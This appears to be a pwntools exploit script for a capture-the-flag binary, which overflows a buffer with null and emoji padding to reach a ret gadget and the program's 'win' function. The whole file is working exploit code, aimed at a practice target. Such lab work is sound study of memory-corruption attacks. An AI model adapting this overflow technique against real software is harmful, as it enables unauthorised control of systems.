from pwn import *
elf  = context.binary = ELF('./chall')
p = process(['python3','wrapper.py'])
rop = ROP(elf)
context.log_level = 'debug'
payload = b'\0' 
# payload += b'A' * (300-21)
payload += '🤭'.encode('utf-8') * 69 
payload += b'A'*3
payload += p64(rop.ret.address)
payload += p64(elf.sym.win)

p.sendline(payload)
p.interactive()